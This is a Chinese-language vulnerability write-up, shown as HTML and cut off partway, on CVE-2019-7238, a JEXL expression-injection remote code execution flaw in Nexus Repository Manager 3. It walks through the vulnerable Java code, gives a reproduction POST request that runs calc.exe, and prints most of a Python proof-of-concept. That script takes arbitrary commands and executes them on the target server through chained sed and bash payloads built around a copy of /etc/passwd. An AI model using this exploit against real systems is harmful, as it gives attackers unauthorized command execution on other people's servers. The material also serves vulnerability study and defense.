&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String format)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// variableSource </span><span class="cs7FFD2630">从</span><span class="cs9FB05234"> asset </span><span class="cs7FFD2630">中来</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;VariableSource variableSource = variableResolverAdapter.fromDocument(asset);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SelectorConfiguration selectorConfiguration = new SelectorConfiguration();</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;selectorConfiguration.setAttributes(ImmutableMap.of(&quot;expression&quot;, jexlExpression));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// JexlSelector.TYPE </span><span class="cs7FFD2630">是常量</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">定义为</span><span class="cs9FB05234"> &#39;jexl&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;selectorConfiguration.setType(JexlSelector.TYPE);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;selectorConfiguration.setName(&quot;preview&quot;);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">解析表达式</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return selectorManager.evaluate(selectorConfiguration, variableSource);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;catch (SelectorEvaluationException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.debug(&quot;Unable to evaluate expression {}.&quot;, jexlExpression, e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">selectorConfiguration</span><span class="cs9C1B1871">保存要生成的表达式</span><span class="cs8926E06">config</span><span class="cs9C1B1871">。</span><span class="cs9FB05234">jexlExpression</span><span class="cs9C1B1871">即前面传入的参数。跟入</span><span class="cs9FB05234">selectorManager.evaluate</span><span class="cs9C1B1871">，在</span><span class="cs8926E06"> components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156 </span><span class="cs9C1B1871">，最终执行了表达式</span></p><p class="cs3A447A38"><span class="cs9FB05234">@Override</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;@Guarded(by = STARTED)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;public boolean evaluate(final SelectorConfiguration selectorConfiguration, final VariableSource variableSource)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throws SelectorEvaluationException</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">根据传入的</span><span class="cs9FB05234"> selectorConfiguration </span><span class="cs7FFD2630">生成对应的</span><span class="cs9FB05234"> selector </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">前面指定了</span><span class="cs9FB05234"> JexlSelector.TYPE </span><span class="cs7FFD2630">，这里将生成</span><span class="cs9FB05234"> JexlSelector</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Selector selector = createSelector(selectorConfiguration);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">调用</span><span class="cs9FB05234"> selector </span><span class="cs7FFD2630">的</span><span class="cs9FB05234"> evaluate </span><span class="cs7FFD2630">方法</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return selector.evaluate(variableSource);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;catch (Exception e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new SelectorEvaluationException(&quot;Selector &#39;&quot; + selectorConfiguration.getName() + &quot;&#39; evaluation in error&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">参考官方文档：</span><span class="cs8926E06"><br/>https://help.sonatype.com/repomanager3/configuration/repository-management#RepositoryManagement-CreatingaQuery</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其对应接口位置如下图</span><span class="cs8926E06"><br/><img src="Web安全/Nexus/%ef%bc%88CVE-2019-7238%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image0.jpg" width="560" height="266" alt="" style="border-width:0px;" /><br/></span><span class="cs9C1B1871">如果是新搭建的环境，为复现成功，还需要先往现有的</span><span class="cs8926E06">Repository</span><span class="cs9C1B1871">添加</span><span class="cs8926E06">asset</span><span class="cs9C1B1871">。这样在查询确实存在</span><span class="cs8926E06">asset</span><span class="cs9C1B1871">后，才会进一步根据</span><span class="cs9FB05234">whereClause</span><span class="cs9C1B1871">对查询结果</span><span class="cs8926E06">asset</span><span class="cs9C1B1871">进行筛选，也才会对</span><span class="cs9FB05234">whereClause</span><span class="cs9C1B1871">进行表达式解析。不过在实际环境中，</span><span class="cs8926E06">Repository</span><span class="cs9C1B1871">中早就各种</span><span class="cs8926E06">asset</span><span class="cs9C1B1871">了。下面随便选了一个</span><span class="cs8926E06">logging.jar</span><span class="cs9C1B1871">上传。</span><span class="cs8926E06"><br/><img src="Web安全/Nexus/%ef%bc%88CVE-2019-7238%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image1.jpg" width="560" height="271" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /service/extdirect HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host:www.0-sec.org:8081</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 308</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">{&quot;action&quot;:&quot;coreui_Component&quot;,&quot;method&quot;:&quot;previewAssets&quot;,&quot;data&quot;:[{&quot;page&quot;:1,&quot;start&quot;:0,&quot;limit&quot;:25,&quot;filter&quot;:[{&quot;property&quot;:&quot;repositoryName&quot;,&quot;value&quot;:&quot;*&quot;},{&quot;property&quot;:&quot;expression&quot;,&quot;value&quot;:&quot;&#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;calc.exe&#39;)&quot;},{&quot;property&quot;:&quot;type&quot;,&quot;value&quot;:&quot;jexl&quot;}]}],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:4}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2019-7238%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image0.png" width="560" height="258" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">cve-2019-7238.py</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Nexus/%ef%bc%88CVE-2019-7238%ef%bc%89Nexus%20Repository%20Manager%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c_files/image1.png" width="560" height="350" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">print(&quot;\nNexus Repository Manager 3 Remote Code Execution - CVE-2019-7238 \nFound by @Rico and @voidfyoo\n&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">proxy = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">remote = &#39;http://127.0.0.1:8081&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ARCH=&quot;LINUX&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># ARCH=&quot;WIN&quot;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def checkSuccess(r):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if r.status_code == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;json_data = json.loads(r.text)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if json_data[&#39;result&#39;][&#39;total&#39;] &gt; 0:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;OK&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;KO&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[-] Error status code&quot;, r.status_code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit()</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">print(&quot;[+] Checking if Content-Selectors exist =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==1&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxies=proxy, verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">checkSuccess(r)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print(&quot;&quot;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ARCH == &quot;LINUX&quot;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = input(&quot;command (not reflected)&gt; &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = base64.b64encode(command.encode(&#39;utf-8&#39;))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command_str = command.decode(&#39;utf-8&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command_str = command_str.replace(&#39;/&#39;, &#39;+&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Copy file to temp directory =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;cp /etc/passwd &nbsp;/tmp/passwd\&quot;)&quot;}, { &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Preparing temp file =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i 1cpwn2 &nbsp;/tmp/passwd\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Cleaning temp file =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i /[^pwn2]/d /tmp/passwd\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Writing command into temp file =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i 1s/pwn2/{echo,&quot; + command_str + &quot;}|{base64,-d}&gt;pwn.txt/g /tmp/passwd\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;verify=False, allow_redirects=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;checkSuccess(r)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Decode base64 command =&gt;&quot;, end=&#39; &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_url = remote + &quot;/service/extdirect&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;burp0_json = {&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [{&quot;filter&quot;: [{&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;}, {&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;bash /tmp/passwd\&quot;)&quot;}, {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;}], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [{&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;}], &quot;start&quot;: 0}], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 